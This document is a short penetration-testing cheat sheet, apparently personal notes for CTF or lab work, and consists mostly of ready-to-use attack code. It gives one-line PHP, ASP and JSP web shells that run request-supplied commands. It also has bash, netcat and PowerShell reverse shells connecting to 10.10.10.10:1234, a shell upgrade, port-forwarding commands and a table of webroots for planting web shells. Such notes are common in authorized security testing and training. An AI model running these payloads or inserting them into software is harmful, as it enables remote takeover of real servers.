##### Upgrade shell:
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

#### PHP
https://github.com/Wh1ter0sEo4/reverse_shell_php/blob/main/reverse_shell.php

```php
<?php system($_REQUEST["cmd"]); ?>
```


##### Java:
https://alionder.net/jenkins-script-console-code-exec-reverse-shell-java-deserialization/

ASP:
```asp
<% eval request("cmd") %>
```

JSP:

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```


##### Socat port forwarding:
Download:
https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat

from 8080 to 8888:
`./socat TCP-LISTEN:8888,fork TCP:127.0.0.1:8080

ssh port forwarding:
```shell-session
root@kali$ ssh -L 55553:127.0.0.1:55553 root@192.168.0.44
```

bash shells:

```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

powershell

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

Where to upload web shell:

| Web Server | Default Webroot        |
| ---------- | ---------------------- |
| `Apache`   | /var/www/html/         |
| `Nginx`    | /usr/local/nginx/html/ |
| `IIS`      | c:\inetpub\wwwroot\|   |
| `XAMPP`    | C:\xampp\htdocs\|      |